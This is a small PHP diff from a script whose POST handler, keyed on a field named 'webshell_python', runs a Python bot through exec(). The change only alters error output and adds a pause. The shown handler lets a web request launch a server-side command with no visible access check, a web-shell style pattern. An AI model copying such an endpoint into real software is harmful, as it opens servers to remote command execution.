@@ -185,7 +185,8 @@ if(isset($_POST["webshell_python"])){
             exec("python3 -u ./bot.py > ./output.log", $out, $error);
         }
         var_dump($out);
-        echo $error;
+        var_dump($error);
+        sleep(10);
         exit;
     }
     if(fopen("./output.log", "r") !== null){
